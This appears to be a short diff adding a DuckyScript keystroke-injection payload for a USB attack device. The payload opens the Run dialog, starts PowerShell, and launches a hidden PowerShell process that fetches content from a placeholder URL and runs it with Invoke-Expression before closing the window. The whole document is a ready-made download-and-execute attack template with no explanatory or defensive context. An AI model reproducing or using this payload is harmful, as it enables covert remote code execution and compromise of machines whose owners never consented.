@@ -1,0 +1,11 @@
+WINDOWS r
+DELAY 500
+STRING powershell
+DELAY 500
+ENTER
+DELAY 500
+STRING Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"(Invoke-WebRequest -Uri url).Content | IEX`"" -PassThru
+ENTER
+DELAY 1000
+STRING exit
+ENTER
